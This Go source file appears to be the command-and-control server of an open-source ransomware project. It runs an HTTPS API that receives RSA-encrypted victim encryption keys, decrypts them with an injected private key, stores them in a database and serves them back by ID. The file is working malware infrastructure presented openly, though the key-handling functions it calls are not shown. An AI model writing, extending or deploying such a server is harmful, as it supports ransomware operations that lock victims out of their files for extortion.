package main

import (
	"log"
	"net/http"
	"strings"

	"github.com/labstack/echo"
	"github.com/labstack/echo/engine"
	"github.com/labstack/echo/engine/standard"
	"github.com/labstack/echo/middleware"
	"github.com/mauri870/ransomware/rsa"
)

var (
	ApiResponseForbidden        = SimpleResponse{Status: http.StatusForbidden, Message: "Seems like you are not welcome here... Bye"}
	ApiResponseBadJson          = SimpleResponse{Status: http.StatusBadRequest, Message: "Expect valid json payload"}
	ApiResponseInternalError    = SimpleResponse{Status: http.StatusInternalServerError, Message: "Internal Server Error"}
	ApiResponseDuplicatedId     = SimpleResponse{Status: http.StatusConflict, Message: "Duplicated Id"}
	ApiResponseBadRSAEncryption = SimpleResponse{Status: http.StatusUnprocessableEntity, Message: "Error validating payload, bad public key"}
	ApiResponseNoPayload        = SimpleResponse{Status: http.StatusUnprocessableEntity, Message: "No payload"}
	ApiResponseBadRequest       = SimpleResponse{Status: http.StatusBadRequest, Message: "Bad Request"}
	ApiResponseResourceNotFound = SimpleResponse{Status: http.StatusTeapot, Message: "Resource Not Found"}
	ApiResponseNotFound         = SimpleResponse{Status: http.StatusNotFound, Message: "Not Found"}

	// RSA Private key
	// Automatically injected on autobuild with make
	PRIV_KEY = []byte(`INJECT_PRIV_KEY_HERE`)

	// BuntDB Database for store the keys
	// It will create if not exists
	Database = "./database.db"
)

type SimpleResponse struct {
	Status  int
	Message string
}

func main() {
	// Start the server
	e := echo.New()
	e.SetHTTPErrorHandler(CustomHTTPErrorHandler)

	e.Use(middleware.Logger())
	e.Use(middleware.Recover())

	api := e.Group("/api", middleware.CORS())
	api.POST("/keys/add", addKeys, DecryptPayloadMiddleware)
	api.GET("/keys/:id", getEncryptionKey)

	log.Println("Listening on port 8080")
	log.Fatal(e.Run(standard.WithConfig(engine.Config{
		Address:     ":8080",
		TLSCertFile: "cert.pem",
		TLSKeyFile:  "key.pem",
	})))
}

func CustomHTTPErrorHandler(err error, c echo.Context) {
	httpError, ok := err.(*echo.HTTPError)
	if ok {
		// If is an API call return a JSON response
		path := c.Request().URL().Path()
		if !strings.HasSuffix(path, "/") {
			path = path + "/"
		}

		if strings.Contains(path, "/api/") {
			c.JSON(httpError.Code, SimpleResponse{Status: httpError.Code, Message: httpError.Message})
			return
		}

		// Otherwise return the normal response
		c.String(httpError.Code, httpError.Message)
	}
}

// DecryptPayloadMiddleware try to decrypt the payload from request
func DecryptPayloadMiddleware(next echo.HandlerFunc) echo.HandlerFunc {
	return func(c echo.Context) error {
		// Retrieve the payload from request
		payload := c.FormValue("payload")
		if payload == "" {
			return c.JSON(http.StatusUnprocessableEntity, ApiResponseNoPayload)
		}

		// Decrypt the payload
		jsonPayload, err := rsa.Decrypt(PRIV_KEY, []byte(payload))
		if err != nil {
			return c.JSON(http.StatusUnprocessableEntity, ApiResponseBadRSAEncryption)
		}

		c.Set("payload", jsonPayload)
		return next(c)
	}
}
